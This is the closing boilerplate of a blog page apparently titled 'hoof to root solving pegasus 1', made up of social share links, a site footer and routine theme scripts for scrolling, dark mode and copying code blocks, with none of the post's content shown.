<a target=_blank rel="noopener noreferrer" aria-label="share hoof to root solving pegasus 1 on twitter" href="https://twitter.com/intent/tweet/?text=hoof%20to%20root%20solving%20pegasus%201&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share hoof to root solving pegasus 1 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&title=hoof%20to%20root%20solving%20pegasus%201&summary=hoof%20to%20root%20solving%20pegasus%201&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share hoof to root solving pegasus 1 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&title=hoof%20to%20root%20solving%20pegasus%201"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share hoof to root solving pegasus 1 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share hoof to root solving pegasus 1 on whatsapp" href="https://api.whatsapp.com/send?text=hoof%20to%20root%20solving%20pegasus%201%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share hoof to root solving pegasus 1 on telegram" href="https://telegram.me/share/url?text=hoof%20to%20root%20solving%20pegasus%201&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>